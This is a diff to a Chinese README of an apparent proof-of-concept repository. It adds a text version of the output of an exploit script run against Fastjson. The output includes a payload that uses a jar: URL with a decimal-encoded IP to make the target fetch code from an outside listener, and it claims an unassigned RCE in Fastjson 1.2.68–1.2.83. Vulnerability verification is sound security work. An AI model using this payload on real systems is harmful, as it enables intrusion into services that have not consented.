@@ -13,6 +13,24 @@ Kali 上执行 `Fastjson-1.2.83-RCE-NO-CVE/poc.py` 的实际输出（目标主�
 
 ![运行效果](Fastjson-1.2.83-RCE-NO-CVE/demo.png)
 
+<details>
+<summary>如果图片加载不出来, 点这里看同样的文字版输出</summary>
+
+```text
+[目标]    http://10.0.0.13:8090/
+[注入点]  JSON 请求体 user.@type (jar: 协议触发 @JSONType 注解探测)
+[Payload] {"user": {"@type": "jar:http://167772175:18081/probe!/POC"}}
+[监听]    0.0.0.0:18081 (十进制 IP 167772175 = 10.0.0.15)
+[响应]    HTTP 400, body: { "message": "JSON parse error: autoType is not support..." }
+[下载]    收到 38 次请求, 路径: /probe
+[结论]    VULNERABLE - Fastjson 1.2.68~1.2.83 jar: 协议 RCE (无 CVE 编号)
+```
+
+> 注: 仓库内图片由 `raw.githubusercontent.com` 提供, 该域名在部分网络环境不可达。
+> 若图片显示为裂图, 属网络问题而非文件缺失; 上面的代码块是同样的内容。
+
+</details>
+
 ## 已有 PoC
 
 | 目录 | 漏洞 | 验证方式 |
